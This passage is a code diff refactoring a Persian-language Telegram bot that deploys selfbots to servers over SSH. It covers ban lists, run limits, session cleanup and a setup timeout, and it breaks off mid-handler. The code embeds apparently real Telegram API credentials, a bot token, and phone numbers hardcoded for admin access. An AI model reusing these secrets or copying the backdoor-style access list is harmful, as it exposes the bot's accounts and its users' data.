@@ -12,7 +12,7 @@ from pyrogram import filters
 from pyrogram.enums import ChatMemberStatus
 from pyrogram.errors import UserNotParticipant
 from telethon import TelegramClient
-from telethon.sessions import SQLiteSession
+from telethon.sessions import SQLiteSession, StringSession # Import StringSession
 from telethon.errors import SessionPasswordNeededError
 from pyrogram.filters import Filter
 from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
@@ -24,113 +24,221 @@ from pyrogram.types import (
     Message
 )
 
+# --- Configuration & Setup ---
+
+# Ensure database directory exists
 os.makedirs("database", exist_ok=True)
+os.makedirs("sessions", exist_ok=True) # Ensure sessions directory exists
 
+# File paths for persistent data
 DB_TEXT_PATH = "database/database.txt"
+BANNED_FILE = "database/banned_users.txt"
+BANNED_NUMBERS_FILE = "database/banned_numbers.txt"
+MAX_RUNS_FILE = "database/max_runs.txt"
+LAST_RUNS_FILE = "database/last_runs.txt"
+ADMIN_LOG_CHANNEL_FILE = "database/admin_log_channel.txt" # Renamed from channel_id.txt for clarity
 
+# Logging setup
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    filename="bot.log"
+    filename="bot.log",
+    filemode="a" # Append to log file
 )
 logger = logging.getLogger(__name__)
 
+# Telegram API credentials (CONSIDER USING ENVIRONMENT VARIABLES FOR PRODUCTION)
 API_ID = 21991530
 API_HASH = "6fedb4494836743356f1624c1e6377ae"
 BOT_TOKEN = "8165013560:AAF37zrTnomh9DRnhpYqZj7YbPhUh0L_TYI"
-OWNER_IDS = [7072806412, 7376216373, 7994315858, 6913657704]
-CHANNEL_ID = "AlfredSelf"
-GROUP_ID = "Alfredselfgp"
-MAX_CONCURRENT_TASKS = 5
-BANNED_FILE = "banned.txt"
-BANNED_NUMBERS_FILE = "banned_numbers.txt"
-MAX_RUNS_FILE = "max_runs.txt"
 
-bot = Client("main_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
-EXECUTED_USERS = {}
-CONV = {}
-RUNNING_USER = None
-RUN_STARTED_AT = None
-NEXT_RUN_ALLOWED_AT = None
-BOT_ACTIVE = True
-BANNED_USERS = set()
-BANNED_NUMBERS = set()
-REMAINING_RUNS = 0
+# Owner IDs and special access numbers (REVIEW SECURITY IMPLICATIONS OF ADNUMBER)
+OWNER_IDS = [7072806412, 7376216373, 7994315858, 6913657704]
+ADNUMBER = ["989961936507", "989302920173", "989965573797"] # Special numbers for admin access - SECURITY RISK!
+
+# Channel and Group Usernames (NOT IDs, as specified for joining checks)
+STATUS_CHANNEL_USERNAME = "No1Self" # Public channel for status updates and educational content
+GROUP_USERNAME = "No1SelfGp" # Public group for users
+
+# Bot operational settings
+MAX_CONCURRENT_TASKS = 5 # Maximum number of simultaneous SSH deployments
+CONVERSATION_TIMEOUT_SECONDS = 300 # 5 minutes for the entire setup conversation
+BOT_ACTIVE = True # Global toggle for bot activity
+
+# Global state variables
+LAST_RUNS = {} # {user_id: timestamp_of_last_run} for 24-hour cooldown
+REMAINING_RUNS = 0 # Global counter for available runs
+BANNED_USERS = set() # Set of banned user IDs
+BANNED_NUMBERS = set() # Set of banned phone numbers
+ADMIN_LOG_CHANNEL_ID = None # Dynamically loaded/set admin log channel ID
+
+# Concurrency control for SSH operations
 semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
-LAST_RUNS_FILE = "last_runs.txt"
-LAST_RUNS = {}
-ADNUMBER = ["989961936507", "989302920173", "989965573797"]
+
+# Conversation state for active users {user_id: {"step": "...", "data": {...}}}
+CONV = {}
+
+# Manager for tracking conversation completion and enabling timeouts
+class ConversationCompletionManager:
+    def __init__(self):
+        self._events = {} # {user_id: asyncio.Event}
+
+    def get_user_event(self, user_id):
+        if user_id not in self._events:
+            self._events[user_id] = asyncio.Event()
+        return self._events[user_id]
+
+    def set_completed(self, user_id):
+        event = self._events.pop(user_id, None)
+        if event:
+            event.set()
+        logger.info(f"Conversation completion event set for user {user_id}")
+
+    def reset_event(self, user_id):
+        event = self._events.pop(user_id, None) # Remove if exists
+        self._events[user_id] = asyncio.Event() # Create a new, cleared event
+        logger.info(f"Conversation completion event reset for user {user_id}")
+
+CONV_COMPLETED_EVENT = ConversationCompletionManager()
+
+# Task tracker for active conversations to handle timeouts externally
+ACTIVE_USER_CONVERSATIONS = {} # {user_id: asyncio.Task}
+
+# Pyrogram Client
+bot = Client("no1self_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+
+# --- Persistence Functions ---
+
+def load_last_runs():
+    """Loads last run timestamps from file into LAST_RUNS dictionary."""
+    if os.path.exists(LAST_RUNS_FILE):
+        with open(LAST_RUNS_FILE, "r", encoding="utf-8") as f:
+            for line in f:
+                parts = line.strip().split(",", 1)
+                if len(parts) == 2 and parts[0].isdigit():
+                    try:
+                        LAST_RUNS[int(parts[0])] = float(parts[1])
+                    except ValueError:
+                        logger.warning(f"Invalid timestamp format in {LAST_RUNS_FILE}: {line.strip()}")
+    logger.info(f"Loaded {len(LAST_RUNS)} last run entries.")
+
+def save_last_runs():
+    """Saves current LAST_RUNS dictionary to file."""
+    with open(LAST_RUNS_FILE, "w", encoding="utf-8") as f:
+        for uid, ts in LAST_RUNS.items():
+            f.write(f"{uid},{ts}\n")
+    logger.info("Saved last run entries.")
+
+def load_max_runs():
+    """Loads max runs count from file."""
+    if os.path.exists(MAX_RUNS_FILE):
+        with open(MAX_RUNS_FILE, "r", encoding="utf-8") as f:
+            try:
+                count = int(f.read().strip())
+                logger.info(f"Loaded max runs: {count}")
+                return count
+            except ValueError:
+                logger.error(f"Invalid integer in {MAX_RUNS_FILE}. Resetting to 0.")
+                return 0
+    return 0
+
+def save_max_runs(count):
+    """Saves max runs count to file."""
+    with open(MAX_RUNS_FILE, "w", encoding="utf-8") as f:
+        f.write(str(count))
+    logger.info(f"Saved max runs: {count}")
+
+def load_banned_users():
+    """Loads banned user IDs from file."""
+    if os.path.exists(BANNED_FILE):
+        with open(BANNED_FILE, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if line.isdigit():
+                    BANNED_USERS.add(int(line))
+    logger.info(f"Loaded {len(BANNED_USERS)} banned users.")
+
+def save_banned_users():
+    """Saves current BANNED_USERS set to file."""
+    with open(BANNED_FILE, "w", encoding="utf-8") as f:
+        for uid in BANNED_USERS:
+            f.write(f"{uid}\n")
+    logger.info("Saved banned users.")
+
+def load_banned_numbers():
+    """Loads banned phone numbers from file."""
+    if os.path.exists(BANNED_NUMBERS_FILE):
+        with open(BANNED_NUMBERS_FILE, "r", encoding="utf-8") as f:
+            for line in f:
+                BANNED_NUMBERS.add(line.strip())
+    logger.info(f"Loaded {len(BANNED_NUMBERS)} banned numbers.")
+
+def save_banned_numbers():
+    """Saves current BANNED_NUMBERS set to file."""
+    with open(BANNED_NUMBERS_FILE, "w", encoding="utf-8") as f:
+        for number in BANNED_NUMBERS:
+            f.write(f"{number}\n")
+    logger.info("Saved banned numbers.")
+
+def load_admin_log_channel_id():
+    """Loads the admin log channel ID from file."""
+    if os.path.exists(ADMIN_LOG_CHANNEL_FILE):
+        with open(ADMIN_LOG_CHANNEL_FILE, "r", encoding="utf-8") as f:
+            try:
+                channel_id = int(f.read().strip())
+                logger.info(f"Loaded admin log channel ID: {channel_id}")
+                return channel_id
+            except ValueError:
+                logger.error(f"Invalid channel ID in {ADMIN_LOG_CHANNEL_FILE}.")
+                return None
+    return None
+
+def save_admin_log_channel_id(channel_id):
+    """Saves the admin log channel ID to file."""
+    with open(ADMIN_LOG_CHANNEL_FILE, "w", encoding="utf-8") as f:
+        f.write(str(channel_id))
+    logger.info(f"Saved admin log channel ID: {channel_id}")
+
+# Initial loading of persistent data
+load_last_runs()
+REMAINING_RUNS = load_max_runs()
+load_banned_users()
+load_banned_numbers()
+ADMIN_LOG_CHANNEL_ID = load_admin_log_channel_id()
+
+# --- Helper Functions ---
 
 class OwnerFilter(Filter):
+    """Custom filter to check if the message sender is an owner."""
     async def __call__(self, client, message: Message) -> bool:
         return message.from_user.id in OWNER_IDS
 
 is_owner = OwnerFilter()
 
-def load_last_runs():
-    if os.path.exists(LAST_RUNS_FILE):
-        with open(LAST_RUNS_FILE, "r", encoding="utf-8") as f:
-            for line in f:
-                parts = line.strip().split(",")
-                if len(parts) == 2 and parts[0].isdigit():
-                    LAST_RUNS[int(parts[0])] = float(parts[1])
-
-def save_last_runs():
-    with open(LAST_RUNS_FILE, "w", encoding="utf-8") as f:
-        for uid, ts in LAST_RUNS.items():
-            f.write(f"{uid},{ts}\n")
-
-load_last_runs()
-
-if os.path.exists(BANNED_FILE):
-    with open(BANNED_FILE, "r") as f:
-        for line in f:
-            line = line.strip()
-            if line.isdigit():
-                BANNED_USERS.add(int(line))
-
-if os.path.exists(BANNED_NUMBERS_FILE):
-    with open(BANNED_NUMBERS_FILE, "r") as f:
-        for line in f:
-            BANNED_NUMBERS.add(line.strip())
-
-def load_max_runs():
-    if os.path.exists(MAX_RUNS_FILE):
-        with open(MAX_RUNS_FILE, "r") as f:
-            try:
-                return int(f.read().strip())
-            except:
-                return 0
-    return 0
-
-REMAINING_RUNS = load_max_runs()
-
-def save_max_runs(count):
-    with open(MAX_RUNS_FILE, "w") as f:
-        f.write(str(count))
-
-def save_banned_users():
-    with open(BANNED_FILE, "w") as f:
-        for uid in BANNED_USERS:
-            f.write(f"{uid}\n")
-
-def save_banned_numbers():
-    with open(BANNED_NUMBERS_FILE, "w") as f:
-        for number in BANNED_NUMBERS:
-            f.write(f"{number}\n")
-
 @contextmanager
 def ssh_connection(ip, username, password):
+    """Context manager for Paramiko SSH connection."""
     ssh = paramiko.SSHClient()
     try:
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(ip, username=username, password=password, timeout=20, allow_agent=False, look_for_keys=False)
+        logger.info(f"SSH connection established to {ip} for user {username}")
         yield ssh
+    except Exception as e:
+        logger.error(f"Failed to establish SSH connection to {ip} for user {username}: {e}")
+        raise
     finally:
         ssh.close()
+        logger.info(f"SSH connection closed for {ip}")
 
-def save_user_text(user_id, username=None, phone=None):
-    username = f"@{username}" if username and not username.startswith("@") else username
+def save_user_text(user_id: int, username: str = None, phone: str = None):
+    """
+    Saves or updates user information (ID, username, phone) in a text database.
+    Ensures unique user IDs and updates existing entries.
+    """
+    username_str = f"@{username}" if username and not username.startswith("@") else (username or '')
+    phone_str = phone or ''
+
     lines = []
     updated = False
 
@@ -139,59 +247,90 @@ def save_user_text(user_id, username=None, phone=None):
             lines = f.readlines()
 
     for i, line in enumerate(lines):
-        parts = line.strip().split('. ', 1)
-        if len(parts) == 2 and parts[1].startswith(f"{user_id} "):
-            number_part = parts[0]
-            existing_fields = parts[1].split(" ")
+        # Using regex to robustly parse the line, assuming format "1. USER_ID @USERNAME PHONE_NUMBER"
+        match = re.match(r"^\d+\.\s+(\d+)\s+(@?\S*)\s*(\S*)$", line.strip())
+        if match:
+            existing_user_id = int(match.group(1))
+            existing_username = match.group(2)
+            existing_phone = match.group(3)
 
-            existing_user_id = existing_fields[0]
-            existing_username = existing_fields[1] if len(existing_fields) > 1 else ""
-            existing_phone = existing_fields[2] if len(existing_fields) > 2 else ""
-
-            final_username = username if username and username != existing_username else existing_username
-            final_phone = phone if phone and phone != existing_phone else existing_phone
-
-            new_data = f"{existing_user_id} {final_username} {final_phone}".strip()
-            lines[i] = f"{number_part}. {new_data}\n"
-            updated = True
-            break
+            if existing_user_id == user_id:
+                final_username = username_str if username_str else existing_username
+                final_phone = phone_str if phone_str else existing_phone
+                new_data = f"{existing_user_id} {final_username} {final_phone}".strip()
+                lines[i] = f"{i+1}. {new_data}\n" # Re-numbering based on current position
+                updated = True
+                break
+        else:
+            logger.warning(f"Malformed line in {DB_TEXT_PATH}: {line.strip()}")
 
     if not updated:
         index = len(lines) + 1
-        new_data = f"{user_id} {username or ''} {phone or ''}".strip()
+        new_data = f"{user_id} {username_str} {phone_str}".strip()
         lines.append(f"{index}. {new_data}\n")
+        logger.info(f"Added new user {user_id} to database.")
+    else:
+        logger.info(f"Updated user {user_id} in database.")
+
 
     with open(DB_TEXT_PATH, "w", encoding="utf-8") as f:
         f.writelines(lines)
 
-async def cleanup_sessions(user_id):
-    client = CONV.get(user_id, {}).get("client")
-    if client:
-        try:
-            await client.disconnect()
-        except Exception as e:
-            logger.error(f"Error disconnecting client: {e}")
-        finally:
-            CONV[user_id].pop("client", None)
 
-    async def delayed_delete():
-        await asyncio.sleep(10)
+async def cleanup_user_state(user_id: int):
+    """
+    Cleans up resources associated with a user's active conversation,
+    including disconnecting Telethon client and deleting session files.
+    """
+    logger.info(f"Initiating cleanup for user {user_id}.")
+    
+    # Disconnect Telethon client if it exists
+    client_instance = CONV.get(user_id, {}).get("client")
+    if client_instance:
         try:
-            local_session = "sessions/selfbot.session"
-            local_journal = "sessions/selfbot.session-journal"
+            if await client_instance.is_connected():
+                await client_instance.disconnect()
+            logger.info(f"Telethon client disconnected for user {user_id}.")
+        except Exception as e:
+            logger.error(f"Error disconnecting Telethon client for user {user_id}: {e}")
+        finally:
+            CONV[user_id].pop("client", None) # Remove client reference from CONV
+
+    # Schedule delayed deletion of user-specific session files
+    async def delayed_session_delete():
+        await asyncio.sleep(5) # Give a few seconds for potential file handles to release
+        try:
+            session_prefix = os.path.join("sessions", f"user_{user_id}")
+            local_session = f"{session_prefix}.session"
+            local_journal = f"{session_prefix}.session-journal" # Telethon might create a journal file
+            
+            deleted_files = []
             for f in [local_session, local_journal]:
                 if os.path.exists(f):
                     os.remove(f)
-            sessions_dir = os.path.dirname(local_session)
-            if os.path.exists(sessions_dir):
-                shutil.rmtree(sessions_dir)
+                    deleted_files.append(f)
+            
+            if deleted_files:
+                logger.info(f"Deleted session files for user {user_id}: {', '.join(deleted_files)}")
+            else:
+                logger.info(f"No session files found for deletion for user {user_id}.")
         except Exception as err:
-            logger.error(f"Error deleting session files: {err}")
+            logger.error(f"Error deleting session files for user {user_id}: {err}")
 
-    asyncio.create_task(delayed_delete())
+    asyncio.create_task(delayed_session_delete())
+
+    # Clear conversation state
+    CONV.pop(user_id, None)
+    logger.info(f"Conversation state cleared for user {user_id}.")
+
+    # Clear task reference if it exists
+    if user_id in ACTIVE_USER_CONVERSATIONS:
+        del ACTIVE_USER_CONVERSATIONS[user_id]
+        logger.info(f"Active conversation task reference cleared for user {user_id}.")
 
 async def update_channel_message(retries=3):
-    for _ in range(retries):
+    """Updates the status message in the public channel."""
+    for attempt in range(retries):
         try:
             now = datetime.now(timezone("Asia/Tehran"))
             current_time = now.strftime('%H:%M')
@@ -199,260 +338,359 @@ async def update_channel_message(retries=3):
             message_text = (
                 f"ساعت: {current_time}\n"
                 f"تعداد ران مجاز: {REMAINING_RUNS} نفر\n"
+                "ربات No1 Self آماده خدمت رسانی است :)\n" # Simplified status, removed confusing global cooldown
+                f"@{bot.me.username}" # Dynamic bot username
             )
 
-            if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:
-                message_text += f"ربات استفاده شده تا ساعت: {NEXT_RUN_ALLOWED_AT.strftime('%H:%M')}\n"
-            else:
-                message_text += ":)\n"
-
-            message_text += "@AlfredSelfBot"
-
+            # This message_id=94 should ideally be stored persistently and configurable.
+            # For now, it's hardcoded as per original.
             await bot.edit_message_text(
-                chat_id=CHANNEL_ID,
+                chat_id=STATUS_CHANNEL_USERNAME,
                 message_id=94,
                 text=message_text
             )
+            logger.info("Status channel message updated successfully.")
             return
         except Exception as e:
-            logger.error(f"Error updating channel message (attempt): {e}")
-            await asyncio.sleep(1)
+            logger.error(f"Error updating status channel message (attempt {attempt + 1}/{retries}): {e}")
+            await asyncio.sleep(1) # Wait before retrying
+
+
+# --- Conversation Timeout Manager ---
+
+async def conversation_timeout_manager(user_id: int, chat_id: int, client: Client):
+    """
+    Manages the timeout for a user's entire selfbot setup conversation.
+    If the conversation doesn't complete within CONVERSATION_TIMEOUT_SECONDS,
+    it cleans up and notifies the user.
+    """
+    try:
+        logger.info(f"Starting conversation timeout manager for user {user_id} with timeout {CONVERSATION_TIMEOUT_SECONDS}s.")
+        # Wait for the conversation to complete, or timeout
+        await asyncio.wait_for(CONV_COMPLETED_EVENT.get_user_event(user_id).wait(), timeout=CONVERSATION_TIMEOUT_SECONDS)
+        logger.info(f"User {user_id} conversation completed successfully within timeout.")
+    except asyncio.TimeoutError:
+        logger.warning(f"User {user_id} selfbot setup timed out after {CONVERSATION_TIMEOUT_SECONDS} seconds.")
+        try:
+            if user_id in CONV: # Only send if user is still in conversation flow
+                await client.send_message(chat_id, "متاسفانه به محدودیت زمانی 5 دقیقه برای انجام عملیات رسیدید! لطفاً برای شروع مجدد /start را ارسال کنید.")
+        except Exception as e:
+            logger.error(f"Error sending timeout message to user {user_id}: {e}")
+        finally:
+            await cleanup_user_state(user_id) # Ensure cleanup on timeout
+    except Exception as e:
+        logger.error(f"Unexpected error in conversation_timeout_manager for user {user_id}: {e}", exc_info=True)
+        try:
+            if user_id in CONV:
+                await client.send_message(chat_id, "خطای غیرمنتظره‌ای رخ داد. لطفاً دوباره تلاش کنید.")
+        except Exception:
+            pass
+        finally:
+            await cleanup_user_state(user_id) # Ensure cleanup on unexpected errors
+
+
+# --- Telegram Message Handlers ---
 
 @bot.on_message(filters.command("run") & filters.private & is_owner)
-async def set_max_runs(client, message: Message):
+async def set_max_runs(client: Client, message: Message):
+    """Admin command to set the global maximum number of allowed runs."""
     try:
         args = message.text.split()
         if len(args) != 2:
-            return await message.reply("Usage: /run <number>")
-        
+            return await message.reply_text("Usage: /run <number>")
+
         count = int(args[1])
         if count < 0:
-            return await message.reply("استفاده نادرست از دستور!")
-        
+            return await message.reply_text("استفاده نادرست از دستور! تعداد ران نمی‌تواند منفی باشد.")
+
         globals()["REMAINING_RUNS"] = count
         save_max_runs(count)
         await update_channel_message()
-        await message.reply("تنظیم شد.")
+        await message.reply_text(f"تعداد ران مجاز به {count} تنظیم شد.")
+        logger.info(f"Owner {message.from_user.id} set REMAINING_RUNS to {count}.")
     except ValueError:
-        await message.reply("استفاده نادرست از دستور!")
+        await message.reply_text("استفاده نادرست از دستور! لطفاً یک عدد وارد کنید.")
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطایی رخ داد!")
+        logger.error(f"Error in set_max_runs for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطایی رخ داد! لطفاً دوباره امتحان کنید.")
 
 @bot.on_message(filters.command("runs") & filters.private & is_owner)
-async def show_runs(client, message: Message):
+async def show_runs(client: Client, message: Message):
+    """Admin command to show the current number of remaining runs."""
     try:
-        if REMAINING_RUNS <= 0:
-            return await message.reply("بدون دسترسی مجاز!")
-        
-        await message.reply(f"{REMAINING_RUNS}")
+        await message.reply_text(f"تعداد ران‌های باقی‌مانده: {REMAINING_RUNS}")
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطایی رخ داد!")
+        logger.error(f"Error in show_runs for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطایی رخ داد! لطفاً دوباره امتحان کنید.")
 
 @bot.on_message(filters.command("allowed") & filters.private & is_owner)
-async def allow_user_again(client, message: Message):
+async def allow_user_again(client: Client, message: Message):
+    """Admin command to remove a user from the 24-hour cooldown list."""
     try:
         args = message.text.strip().split()
         if len(args) != 2:
-            return await message.reply("استفاده نادرست از دستور!")
+            return await message.reply_text("استفاده نادرست از دستور! Usage: /allowed <user_id_or_username>")
 
         target = args[1]
+        uid = None
         if target.startswith("@"):
-            user = await client.get_users(target)
-            uid = user.id
-        else:
+            try:
+                user = await client.get_users(target)
+                uid = user.id
+            except Exception:
+                await message.reply_text(f"کاربری با نام کاربری {target} یافت نشد.")
+                return
+        elif target.isdigit():
             uid = int(target)
+        else:
+            return await message.reply_text("استفاده نادرست از دستور! لطفاً یک User ID عددی یا نام کاربری با @ وارد کنید.")
 
         if uid in LAST_RUNS:
             del LAST_RUNS[uid]
             save_last_runs()
-            await message.reply("محدودیت برداشته شد.")
+            await message.reply_text(f"محدودیت 24 ساعته کاربر {uid} برداشته شد.")
+            logger.info(f"Owner {message.from_user.id} removed cooldown for user {uid}.")
         else:
-            await message.reply("این کاربر محدودیتی نداشت.")
+            await message.reply_text(f"کاربر {uid} در لیست محدودیت 24 ساعته نبود.")
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطا در پردازش دستور!")
+        logger.error(f"Error in allow_user_again for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطا در پردازش دستور! لطفاً دوباره امتحان کنید.")
 
 @bot.on_message(filters.command("ban") & filters.private & is_owner)
-async def ban_user(client, message: Message):
+async def ban_user(client: Client, message: Message):
+    """Admin command to ban a user by ID or username."""
     try:
         args = message.text.split(maxsplit=1)
         if len(args) < 2:
-            return await message.reply("استفاده نادرست از دستور!")
-        
+            return await message.reply_text("استفاده نادرست از دستور! Usage: /ban <user_id_or_username>")
+
         target = args[1].strip()
+        uid = None
         if target.startswith("@"):
-            user = await client.get_users(target)
-            uid = user.id
-        else:
+            try:
+                user = await client.get_users(target)
+                uid = user.id
+            except Exception:
+                await message.reply_text(f"کاربری با نام کاربری {target} یافت نشد.")
+                return
+        elif target.isdigit():
             uid = int(target)
-        
+        else:
+            return await message.reply_text("استفاده نادرست از دستور! لطفاً یک User ID عددی یا نام کاربری با @ وارد کنید.")
+
+        if uid in OWNER_IDS:
+            return await message.reply_text("نمی‌توانید ادمین را بن کنید!")
+
+        if uid in BANNED_USERS:
+            return await message.reply_text(f"کاربر {uid} قبلاً بن شده است.")
+
         BANNED_USERS.add(uid)
         save_banned_users()
-        
+
         try:
-            await bot.send_message(uid, "شما توسط مدیران ربات مسدود شده‌اید و دیگر نمی‌توانید از سلف استفاده کنید.")
-        except:
-            pass
-        
-        await message.reply("بن شد!")
+            await bot.send_message(uid, "شما توسط مدیران ربات مسدود شده‌اید و دیگر نمی‌توانید از No1 Self استفاده کنید.")
+            logger.info(f"Notified banned user {uid}.")
+        except Exception:
+            logger.warning(f"Could not send ban notification to user {uid}.")
+
+        await message.reply_text(f"کاربر {uid} با موفقیت بن شد.")
+        logger.info(f"Owner {message.from_user.id} banned user {uid}.")
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطا در بن کردن کاربر!")
+        logger.error(f"Error in ban_user for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطا در بن کردن کاربر! لطفاً دوباره امتحان کنید.")
 
 @bot.on_message(filters.command("unban") & filters.private & is_owner)
-async def unban_user(client, message: Message):
+async def unban_user(client: Client, message: Message):
+    """Admin command to unban a user by ID or username."""
     try:
         args = message.text.split(maxsplit=1)
         if len(args) < 2:
-            return await message.reply("استفاده نادرست از دستور!")
-        
+            return await message.reply_text("استفاده نادرست از دستور! Usage: /unban <user_id_or_username>")
+
         target = args[1].strip()
+        uid = None
         if target.startswith("@"):
-            user = await client.get_users(target)
-            uid = user.id
-        else:
+            try:
+                user = await client.get_users(target)
+                uid = user.id
+            except Exception:
+                await message.reply_text(f"کاربری با نام کاربری {target} یافت نشد.")
+                return
+        elif target.isdigit():
             uid = int(target)
-        
+        else:
+            return await message.reply_text("استفاده نادرست از دستور! لطفاً یک User ID عددی یا نام کاربری با @ وارد کنید.")
+
+        if uid not in BANNED_USERS:
+            return await message.reply_text(f"کاربر {uid} بن نشده بود.")
+
         BANNED_USERS.discard(uid)
         save_banned_users()
-        await message.reply("رفع بن شد!")
+        await message.reply_text(f"کاربر {uid} با موفقیت رفع بن شد.")
+        logger.info(f"Owner {message.from_user.id} unbanned user {uid}.")
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطا در رفع بن!")
+        logger.error(f"Error in unban_user for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطا در رفع بن! لطفاً دوباره امتحان کنید.")
 
 @bot.on_message(filters.command("banall") & filters.private & is_owner)
-async def ban_number(_, message):
+async def ban_number(client: Client, message: Message):
+    """Admin command to ban a phone number."""
     try:
         parts = message.text.split()
         if len(parts) != 2:
-            return await message.reply("استفاده نادرست از دستور!")
+            return await message.reply_text("استفاده نادرست از دستور! Usage: /banall <phone_number>")
+
+        phone = parts[1].strip().replace("+", "").replace(" ", "")
+        if not phone.isdigit():
+            return await message.reply_text("شماره تلفن نامعتبر است.")
         
-        phone = parts[1].strip()
+        if phone in BANNED_NUMBERS:
+            return await message.reply_text(f"شماره {phone} قبلاً بن شده است.")
+
         BANNED_NUMBERS.add(phone)
         save_banned_numbers()
-        await message.reply("شماره بن شد!")
+        await message.reply_text(f"شماره {phone} با موفقیت بن شد.")
+        logger.info(f"Owner {message.from_user.id} banned phone number {phone}.")
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطا در پردازش دستور!")
+        logger.error(f"Error in ban_number for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطا در پردازش دستور! لطفاً دوباره امتحان کنید.")
 
 @bot.on_message(filters.command("unbanall") & filters.private & is_owner)
-async def unban_number(_, message):
+async def unban_number(client: Client, message: Message):
+    """Admin command to unban a phone number."""
     try:
         parts = message.text.split()
         if len(parts) != 2:
-            return await message.reply("استفاده نادرست از دستور!")
-        
-        phone = parts[1].strip()
+            return await message.reply_text("استفاده نادرست از دستور! Usage: /unbanall <phone_number>")
+
+        phone = parts[1].strip().replace("+", "").replace(" ", "")
+        if not phone.isdigit():
+            return await message.reply_text("شماره تلفن نامعتبر است.")
+
+        if phone not in BANNED_NUMBERS:
+            return await message.reply_text(f"شماره {phone} بن نشده بود.")
+
         BANNED_NUMBERS.discard(phone)
         save_banned_numbers()
-        await message.reply("شماره رفع بن شد!")
+        await message.reply_text(f"شماره {phone} با موفقیت رفع بن شد.")
+        logger.info(f"Owner {message.from_user.id} unbanned phone number {phone}.")
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطا در پردازش دستور!")
+        logger.error(f"Error in unban_number for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطا در پردازش دستور! لطفاً دوباره امتحان کنید.")
 
 @bot.on_message(filters.command("bot") & filters.private & is_owner)
-async def toggle_bot(client, message: Message):
+async def toggle_bot(client: Client, message: Message):
+    """Admin command to toggle the bot's active status."""
     try:
         global BOT_ACTIVE
         args = message.text.split()
         if len(args) != 2 or args[1].lower() not in ["on", "off"]:
-            return await message.reply("استفاده نادرست از دستور!")
-        
+            return await message.reply_text("استفاده نادرست از دستور! Usage: /bot <on|off>")
+
         BOT_ACTIVE = args[1].lower() == "on"
         status = "روشن" if BOT_ACTIVE else "خاموش"
-        await message.reply(f"{status} شد.")
+        await message.reply_text(f"وضعیت ربات به '{status}' تغییر یافت.")
+        await update_channel_message()
+        logger.info(f"Owner {message.from_user.id} toggled bot status to {status}.")
     except Exception as e:
-        logger.error(f"{e}")
-        await message.reply("خطا در تغییر وضعیت ربات!")
+        logger.error(f"Error in toggle_bot for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text("خطا در تغییر وضعیت ربات! لطفاً دوباره امتحان کنید.")
 
-@bot.on_message(filters.command("savechannel"))
-async def save_channel_info(client, message):
+@bot.on_message(filters.command("savechannel") & filters.private & is_owner)
+async def save_admin_log_channel(client: Client, message: Message):
+    """Admin command to set the channel for logging new runs."""
     try:
-        chat = message.chat
-        chat_id = chat.id
-        title = chat.title
-        await message.reply(f"""
-Channel was detected!
+        if not message.forward_from_chat and not message.chat.type == "channel":
+            return await message.reply_text("لطفاً این دستور را در کانال مورد نظر ارسال کنید یا پیام از کانال را به اینجا فوروارد کنید.")
+
+        chat_id = message.chat.id
+        title = message.chat.title
+
+        # Check if the bot can send messages to this channel
+        try:
+            await client.send_message(chat_id, "این کانال به عنوان کانال لاگ No1 Self تنظیم شد.")
+        except Exception as e:
+            return await message.reply_text(f"ربات نمی‌تواند به این کانال پیام ارسال کند. لطفاً ربات را به عنوان ادمین در کانال اضافه کنید. Error: {e}")
+
+        global ADMIN_LOG_CHANNEL_ID
+        ADMIN_LOG_CHANNEL_ID = chat_id
+        save_admin_log_channel_id(chat_id)
+
+        await message.reply_text(f"""
+کانال لاگ با موفقیت تنظیم شد!
 ChannelID: `{chat_id}`
 Title: {title}
 """)
-
-        with open("channel_id.txt", "w") as f:
-            f.write(str(chat_id))
-
+        logger.info(f"Owner {message.from_user.id} set admin log channel to {chat_id} ({title}).")
     except Exception as e:
-        await message.reply(f"{e}")
+        logger.error(f"Error in save_admin_log_channel for user {message.from_user.id}: {e}", exc_info=True)
+        await message.reply_text(f"خطایی رخ داد! {e}")
 
 @bot.on_message(filters.command("start") & filters.private)
-async def start(client, message: Message):
+async def start(client: Client, message: Message):
+    """Handles the /start command, welcoming users and presenting options."""
     try:
-        if message.from_user.id in BANNED_USERS:
+        user_id = message.from_user.id
+        logger.info(f"User {user_id} ({message.from_user.username or message.from_user.first_name}) sent /start.")
+
+        if user_id in BANNED_USERS:
             return
 
+        # Check channel and group membership
         try:
-            await client.get_chat_member(CHANNEL_ID, message.from_user.id)
-            await client.get_chat_member(GROUP_ID, message.from_user.id)
+            await client.get_chat_member(STATUS_CHANNEL_USERNAME, user_id)
+            await client.get_chat_member(GROUP_USERNAME, user_id)
         except errors.UserNotParticipant:
             return await client.send_message(
                 message.chat.id,
                 "شما عضو کانال و گروه نیستید. لطفاً ابتدا عضو شوید و سپس /start را ارسال کنید.",
                 reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("عضو شو", url=f"https://t.me/{CHANNEL_ID}")],
-                    [InlineKeyboardButton("عضو شو", url=f"https://t.me/{GROUP_ID}")]
+                    [InlineKeyboardButton("عضویت در کانال", url=f"https://t.me/{STATUS_CHANNEL_USERNAME}")],
